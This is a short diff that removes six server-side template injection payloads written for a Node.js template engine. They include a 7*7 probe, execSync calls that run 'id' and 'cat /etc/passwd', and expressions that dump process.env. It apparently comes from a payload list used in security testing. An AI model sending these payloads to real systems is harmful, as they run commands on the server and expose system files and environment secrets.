@@ -1,6 +1,0 @@
-{{= 7*7 }}
-{{= global.process.mainModule.require('child_process').execSync('id').toString() }}
-{{= global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() }}
-{{= typeof global.process }}
-{{= Object.keys(global.process.env) }}
-{{= JSON.stringify(global.process.env) }}
